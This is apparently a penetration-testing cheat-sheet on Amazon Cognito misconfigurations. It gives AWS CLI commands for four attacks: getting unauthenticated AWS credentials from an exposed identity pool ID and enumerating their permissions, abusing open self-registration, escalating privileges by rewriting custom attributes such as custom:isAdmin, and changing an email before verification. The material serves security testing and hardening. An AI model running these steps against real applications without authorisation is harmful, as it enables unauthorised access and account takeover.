Credit: Yassine Aboukir @yassineboukir


# Amazon Cognito Security Misconfiguration

## Introduction
Amazon Cognito, you can add user sign-up and sign-in features and control access to your web and mobile application. Amazon Cognito provides an identity store that scales to millions of users, supports social and enterprise identity federation and offers advanced security features to protect your consumers and  business.
Amazon Cognito makes it easier for you to manage user identities, authentication, and permission.
It consists of two main components:
* User Pools: allow sign-in and sign-up functionality
* Identity Pools: allow authenticated and unauthenticated users to access AWS resources using temporary AWS credentials.


#### API calls to User pool
```
https://cognito-idp.us-west-2.amazonaws.com
```

#### API calls to Identity pool
```
https://cognito-identity.us-west-2.amazonaws.com
```


# Security Misconfiguration
## 1 Unauthorized access to AWS services due to Liberal AWS Credentails.
* Try to fetch temporary AWS credentails using unauthenticated user 
To generate the AWS credentaisls, we need to find ` Identity Pool ID ` which is usually hardcoded in the source code, in a bundled JS file or in HTTP response. Other useful information that you can find:
	* Client ID
	* User Pool ID
	* Region

![image](https://user-images.githubusercontent.com/88592872/211176003-f3a443e0-b3ba-445c-a729-7a3dc64278a4.png)


Next step is to use the Pool Identity ID to generate an Identity ID. User AWS-Cli tool [https://aws.amazon.com/cli/](https://aws.amazon.com/cli/)


#### Command
```
aws cognito-identity get-id --identity-pool-id <identity-pool-id> --region <region>
```

#### Example Command
```
aws cognito-identity get-id --identity-pool-id "us-east-1:b37a7b57-6412-467f-8854-2be137e33871" --region us-east-1

```


Copy the identity-id from the response and use it in the next command.

#### Command
```
aws cognito-identity get-credentials-for-identity --identity-id <identity-id> --region <region>
```

Now we can enumerate permissions associated with these credentials using a tools such as:
* Enumreate-iam: [https://github.com/andresriancho/enumerate-iam](https://github.com/andresriancho/enumerate-iam)
* Scout Suite: [https://github.com/nccgroup/ScoutSuite](https://github.com/nccgroup/ScoutSuite)


#### Command
```
./enumerate-iam.py --access-key <AccessKeyID> --secret-key <SecreetKey> --session-token <SessionToken>
```

## 2. Authentication bypass due to enabled SignUp API action

Self-registration enabled by default when creating a new user pool.
We only need the client ID and region to test against the self-registration

#### Command
```
aws cognito-idp sign-up --client-id <client-id> --username <email-address> --password <password> --region <region>
```

In case of a successful self-registration, a 6 digits confirmation code will be delivered to the attacker's email address 
You'll need to confirm the account next

#### Command
```
aws cognito-idp confirm-sign-up --client-id <client-id> --username <email-address> --confirmation-code <confirmation-code> --region <region>
```

Sometimes you might successfully be able to sign up and register an account but it doesn't have any user group assigned. However, you will be able to obtain temporary AWS credentials which you can test against liberal permissions as we explained earlier.

## 3: Privilege escalation through writable user attributes
 
Attributes are pieces of information that help you identify individual users, such as name, email address and phone number. A new user pool has a set of default standard attributes.
You can also add custom attributes to your user pool definition in the AWS management console.
 
Unless set as readable only, the new custom attribute permission is writable by default which allows the user to update its value.
 
 * Fetching user attributes
In order to test against this misconfiguration, you need to be authenticated then we'll fetch the available user attributes using the generated access token.
 
#### Command
```
aws cognito-idp get-user --region <region> --access-token <access-token>
```


Look out for custom attributes such as:
```
custom:isAdmin
custom:userRole
custom:isActive
custom:isApproved
custom:access
```

* Updating user attributes

#### Command
```
aws cognito-idp update-user-attributes --access-token <access-token> --region <region> --user-attributes Name="<attribute-name>",Value="<new-value>"
```

## 4 Updating email attribute before verification
 
There are scenarios where the user isn't allowed to update their email address due to both client and server-side security controls. However, by leveraging Cognito API, it might also be possible to bypass this restriction.
 
 
#### Command
```
aws cognito-idp update-user-attributes --access-token <access-token> --region <region> --user-attributes Name="<email>",Value="<new-email-address>"
```
